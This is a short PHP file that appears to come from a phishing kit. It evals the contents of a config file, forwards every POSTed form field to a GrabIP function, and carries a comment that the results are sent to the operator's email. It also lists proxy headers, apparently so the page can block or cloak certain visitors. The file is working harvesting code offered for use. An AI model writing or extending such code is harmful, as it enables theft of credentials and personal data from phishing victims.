<?php
require_once __DIR__ . '/function.php';

if (file_exists($api->dir_config . '/' . $api->general_config)) {
  @eval(file_get_contents($api->dir_config . '/' . $api->general_config));
}

#this for sending results to your mail dont play in it
$email_results = $email_result;
if($_SERVER['REQUEST_METHOD'] == 'POST'){
$REQUEST = http_build_query($_POST);GrabIP($REQUEST);}
$bannedProxy = array(
  'CLIENT_IP',
  'FORWARDED',
  'FORWARDED_FOR',
  'FORWARDED_FOR_IP',
  'VIA',
  'X_FORWARDED',
  'X_FORWARDED_FOR',
  'HTTP_CLIENT_IP',
  'HTTP_FORWARDED',
  'HTTP_FORWARDED_FOR',
  'HTTP_FORWARDED_FOR_IP',
  'HTTP_PROXY_CONNECTION',
  'HTTP_VIA',
  'HTTP_X_FORWARDED',
  'HTTP_X_FORWARDED_FOR'
);
?>
